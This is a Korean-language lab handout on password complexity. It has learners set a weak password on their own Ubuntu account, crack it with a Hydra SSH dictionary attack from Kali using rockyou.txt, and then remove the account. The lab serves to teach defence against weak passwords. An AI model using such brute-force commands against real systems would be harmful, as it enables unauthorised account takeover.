## 패스워드 복잡성 설정

취약한 패스워드를 허용하면 어떤 문제가 발생할 수 있는지 알아봅시다.

### 실습 1 : SSH를 통한 사전 대입 공격

** 먼저 우분투 시스템에 접속하여 취약하게 설정합니다. **

1. 취약한 사용자 계정을 하나 만듭니다. 패스워드를 `111111`로 설정합니다(또는 기존 계정의 패스워드를 `111111`으로 변경합니다). 아래에서는 사용자명이 `aaa`인 계정을 추가합니다.
```
cju@wooam:~$ sudo adduser aaa
```

2. IP 주소를 확인합니다.
```
cju@wooam:~$ ip a
```

**공격!!! (칼리)**

3.  Hydra 도구를 사용한 사전 대입 공격
```
$ hydra -l aaa -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.XXX.xxx
```

4. [칼리] 패스워드가 보인다!
```
[22][ssh] host: 192.168.XXX.XXX   login: aaa   password: 111111
```

5. [칼리] (참고) 사전 파일 확인
```
$ vi /usr/share/wordlists/rockyou.txt.gz
```

>> (참고) 우분투 기본 패스워드 정책 확인 : `vi /etc/pam.d/common-passwd`  
>> [https://manpages.ubuntu.com/manpages/jammy/man8/pam_unix.8.html](https://manpages.ubuntu.com/manpages/jammy/man8/pam_unix.8.html)

### 복구
1. [우분투] (필요시) 생성한 계정 삭제
```
cju@wooam:~$ sudo deluser --remove-all-files aaa
```